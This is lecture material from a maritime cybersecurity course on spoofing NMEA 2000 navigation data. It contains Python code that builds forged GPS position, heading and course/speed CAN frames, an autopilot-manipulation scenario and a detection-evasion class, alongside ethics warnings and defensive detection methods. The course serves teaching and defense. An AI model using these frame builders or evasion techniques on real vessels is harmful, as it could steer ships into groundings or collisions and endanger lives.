---
title: "Class 05"
subtitle: "Navigation Spoofing Attacks"
author: "Constantine Macris"
date: "2026"
titlepage: true
titlepage-color: "1E3A5F"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
description: |
    Spoofing GPS position and heading data on NMEA 2000
---

# Class 05 -- Navigation Spoofing Attacks

## Learning Outcomes

- Construct valid NMEA 2000 navigation messages
- Execute GPS position spoofing attacks
- Spoof heading data to manipulate autopilot
- Understand attack timing and evasion
- Recognize impact on vessel safety

## Definitions

- **Spoofing** -- Injecting false messages that appear legitimate
- **Autopilot** -- System that automatically steers vessel
- **ECDIS** -- Electronic Chart Display and Information System
- **COG** -- Course Over Ground
- **SOG** -- Speed Over Ground

## Reading Assignment

- Literature Review: Section 2.4 (Attack Taxonomy)
- Literature Review: Section 3 (Jeep Cherokee Hack methodology)
- GPS spoofing incidents in maritime (provided articles)

## Ethics and Legal Warning

**CRITICAL SAFETY NOTICE**

Navigation spoofing can cause:
- Vessel grounding
- Collisions
- Loss of life
- Environmental disasters

**ALL activities in this course are on ISOLATED TEST NETWORKS ONLY**

Students must sign ethics agreement before proceeding.

<!--
Instructor Notes:

Spend significant time on ethics:
1. Real vessels could be damaged or sunk
2. People could die
3. Legal consequences are severe
4. This knowledge is for DEFENSE

Have students sign ethics agreement form.
Emphasize: Isolated test network only!
-->

## Why Spoofing Works

### CAN Bus Vulnerabilities Exploited

1. **No authentication**: Any node can send any message
2. **No encryption**: Can observe and replicate messages
3. **Broadcast nature**: Injected messages reach all devices
4. **Priority override**: Attacker can win arbitration

### Receiver Behavior

- Chart plotters display received position
- Autopilots follow received heading
- No verification of message source
- Trust whatever data arrives

## Position Spoofing (PGN 129025)

### Message Structure

```
PGN 129025: Position, Rapid Update
Rate: 10 Hz (100ms)

Byte 0-3: Latitude (1e-7 degrees, signed int32)
Byte 4-7: Longitude (1e-7 degrees, signed int32)
```

### Building a Spoofed Position

```python
import struct

def build_position_pgn(latitude, longitude, source_addr=254):
    """
    Build PGN 129025 Position Rapid Update

    Args:
        latitude: Decimal degrees (positive=N, negative=S)
        longitude: Decimal degrees (positive=E, negative=W)
        source_addr: Source address to spoof
    """
    # Convert to raw values
    lat_raw = int(latitude / 1e-7)
    lon_raw = int(longitude / 1e-7)

    # Build CAN ID
    priority = 2
    pgn = 129025
    data_page = (pgn >> 16) & 0x1
    pdu_format = (pgn >> 8) & 0xFF
    pdu_specific = pgn & 0xFF

    can_id = (priority << 26) | (data_page << 24) | \
             (pdu_format << 16) | (pdu_specific << 8) | source_addr

    # Build data payload
    data = struct.pack('<ii', lat_raw, lon_raw)

    return can_id, data

# Example: Spoof position to Narragansett Bay
can_id, data = build_position_pgn(41.4500, -71.4500, source_addr=36)
print(f"CAN ID: {can_id:08X}")
print(f"Data: {data.hex()}")
```

### Attack Execution

```python
# Using OpenBridge CSV format
# Command 4 = Position Rapid Update
latitude = 41.45
longitude = -71.45

command = f"4,{latitude},{longitude}"
# Send via serial to OpenBridge
```

<!--
Instructor Notes:

Walk through the attack step by step:

1. Choose target position
2. Calculate raw values
3. Build CAN frame
4. Inject at correct rate (10 Hz)
5. Observe effect on chart plotter

Demo on isolated network if available.

Discuss: What if attacker gradually shifts position?
(Harder to detect than sudden jump)
-->

## Heading Spoofing (PGN 127250)

### Message Structure

```
PGN 127250: Vessel Heading
Rate: 10 Hz (100ms)

Byte 0: SID (Sequence ID)
Byte 1-2: Heading (radians * 10000, unsigned)
Byte 3-4: Deviation (radians * 10000, signed)
Byte 5-6: Variation (radians * 10000, signed)
Byte 7: Reference (bits 0-1: 0=True, 1=Magnetic)
```

### Building a Spoofed Heading

```python
import struct
import math

def build_heading_pgn(heading_deg, reference='magnetic', source_addr=254):
    """
    Build PGN 127250 Vessel Heading

    Args:
        heading_deg: Heading in degrees (0-360)
        reference: 'true' or 'magnetic'
        source_addr: Source address to spoof
    """
    # Convert heading to radians * 10000
    heading_rad = math.radians(heading_deg)
    heading_raw = int(heading_rad * 10000)

    # Build CAN ID
    priority = 2
    pgn = 127250
    data_page = (pgn >> 16) & 0x1
    pdu_format = (pgn >> 8) & 0xFF
    pdu_specific = pgn & 0xFF

    can_id = (priority << 26) | (data_page << 24) | \
             (pdu_format << 16) | (pdu_specific << 8) | source_addr

    # Build data payload
    sid = 0
    ref_byte = 1 if reference == 'magnetic' else 0
    deviation = 0x7FFF  # Not available
    variation = 0x7FFF  # Not available

    data = struct.pack('<BHhhB',
                      sid,
                      heading_raw,
                      deviation,
                      variation,
                      ref_byte)

    return can_id, data

# Example: Spoof heading to 90 degrees (East)
can_id, data = build_heading_pgn(90.0, 'magnetic', source_addr=36)
```

### Autopilot Manipulation

If vessel has autopilot engaged:

1. Autopilot reads heading from PGN 127250
2. Compares to desired course
3. Adjusts rudder to correct "error"

**Attack**: Spoof heading 10° off actual
- Autopilot thinks vessel is off course
- Applies rudder correction
- Vessel actually turns in wrong direction!

<!--
Instructor Notes:

This is the most dangerous attack scenario:
- Autopilot actively steers based on false data
- Vessel turns opposite direction
- Crew may not notice immediately

Real incident: GPS spoofing in Black Sea
- Ships thought they were 25 miles inland
- Over 20 vessels affected simultaneously

Show news articles about GPS spoofing incidents.
-->

## COG/SOG Spoofing (PGN 129026)

### Message Structure

```
PGN 129026: COG & SOG, Rapid Update
Rate: 10 Hz

Byte 0: SID
Byte 1: COG Reference (bits 0-1)
Byte 2-3: COG (radians * 10000)
Byte 4-5: SOG (0.01 m/s)
Byte 6-7: Reserved
```

### Building Spoofed COG/SOG

```python
def build_cogsog_pgn(cog_deg, sog_knots, source_addr=254):
    """
    Build PGN 129026 COG & SOG Rapid Update
    """
    import math

    cog_rad = math.radians(cog_deg)
    cog_raw = int(cog_rad * 10000)

    # Convert knots to 0.01 m/s
    sog_ms = sog_knots / 1.944
    sog_raw = int(sog_ms * 100)

    # Build CAN ID
    priority = 2
    pgn = 129026
    # ... (similar to above)

    # Data
    sid = 0
    ref = 1  # Magnetic

    data = struct.pack('<BBHHxx',
                      sid,
                      ref,
                      cog_raw,
                      sog_raw)

    return can_id, data
```

## Attack Timing Considerations

### Message Rate Matching

Legitimate GPS sends at 10 Hz. Attacker options:

1. **Overwhelm**: Send faster (20+ Hz)
   - Pro: Ensures spoofed data dominates
   - Con: Detectable by frequency monitoring

2. **Replace**: Send at same rate
   - Pro: Harder to detect
   - Con: Race condition with legitimate messages

3. **Suppress + Replace**: DoS legitimate source, then spoof
   - Pro: Clean replacement
   - Con: More complex, DoS detectable

### Gradual vs. Sudden Changes

| Approach | Detection Risk | Effectiveness |
|----------|---------------|---------------|
| Sudden jump | HIGH - obvious anomaly | Immediate effect |
| Gradual drift | LOW - looks like normal movement | Takes longer |
| Match vessel motion | LOWEST - consistent with physics | Most sophisticated |

<!--
Instructor Notes:

Discuss attack sophistication levels:

Level 1: Just inject messages (easily detected)
Level 2: Match timing and rates (harder to detect)
Level 3: Realistic physics-based trajectories (very hard)

Most real attacks are Level 1 or 2.
Level 3 requires significant planning and vessel knowledge.
-->

## Detection Evasion

### What Might Detect Us?

1. **Frequency monitoring**: Unusual message rates
2. **Value monitoring**: Impossible position jumps
3. **Cross-validation**: GPS vs. other sensors
4. **Clock skew**: Message timing fingerprints

### Evasion Techniques

```python
class StealthSpoofer:
    def __init__(self, baseline):
        self.baseline = baseline  # From reconnaissance
        self.last_send = {}

    def should_send(self, pgn):
        """Match baseline frequency"""
        if pgn not in self.last_send:
            return True

        expected_interval = 1.0 / self.baseline[pgn]['frequency']
        actual_interval = time.time() - self.last_send[pgn]

        # Add small random jitter to match natural variation
        jitter = random.gauss(0, self.baseline[pgn]['std_interval'])

        return actual_interval >= (expected_interval + jitter)

    def send_spoofed(self, pgn, data):
        if self.should_send(pgn):
            # Send message
            self.last_send[pgn] = time.time()
```

## Impact Analysis

### Navigation System Effects

| Attack | Immediate Effect | Safety Impact |
|--------|-----------------|---------------|
| Position +1nm | Chart shows wrong location | Moderate |
| Position +10nm | Far off actual position | High |
| Heading +10° | Autopilot turns wrong way | Critical |
| Heading +180° | Completely reversed | Critical |
| SOG = 0 | Appears stationary | Moderate |

### Cascading Effects

1. ECDIS shows wrong position
2. AIS transmits false position to other vessels
3. Collision avoidance calculates wrong CPA
4. Voyage recorder logs false data
5. Weather routing uses wrong position

<!--
Instructor Notes:

Discuss cascading failures:
- Modern vessels are highly integrated
- One false input affects many systems
- Crew may not notice subtle errors

Example scenario:
"Vessel thinks it's 1nm from shore when actually 100m"
What happens next?
-->

## Defense Implications

### What We Learned as Defenders

1. Need to monitor for sudden position/heading changes
2. Cross-validate GPS with other sources (radar, visual)
3. Track message frequencies for anomalies
4. Consider message source authentication (future)

### Detection Opportunities

| Attack Characteristic | Detection Method |
|----------------------|------------------|
| Sudden value change | Value delta monitoring |
| Wrong frequency | Frequency baseline comparison |
| Physics violations | Kalman filter prediction |
| Source impersonation | Clock skew fingerprinting |

## Lab Preview: Week 6

In Lab 06, you will:

1. Use OpenBridge to construct spoofed position
2. Inject spoofed heading messages
3. Observe effects on chart plotter (simulation)
4. Measure detection opportunities
5. Document attack parameters

**Safety**: All activities on isolated test network only

## Homework

### Required

1. **Read**: Literature Review Section 2.4 and Section 3
2. **Calculate**: Raw values for these spoofed positions:
   - Newport, RI (41.49°N, 71.31°W)
   - Block Island (41.17°N, 71.58°W)
3. **Write**: 200-word analysis of GPS spoofing incident (choose one from news)

### Suggested

- Watch: DEF CON GPS spoofing presentations
- Research: IMO guidance on GNSS vulnerabilities
- Consider: How would you detect your own attack?

## Discussion Questions

1. Why can't chart plotters verify message authenticity?
2. How could gradual position drift go unnoticed?
3. What physical sensors could cross-check GPS?
4. Should NMEA 2000 devices implement authentication?

## References

- [GPS Spoofing in the Black Sea]
- [IMO GNSS Vulnerability Assessment]
- [USCG Navigation Center Advisories]

[GPS Spoofing in the Black Sea]:https://www.maritime-executive.com/article/mass-gps-spoofing-attack-in-black-sea
[IMO GNSS Vulnerability Assessment]:https://www.imo.org
[USCG Navigation Center Advisories]:https://www.navcen.uscg.gov
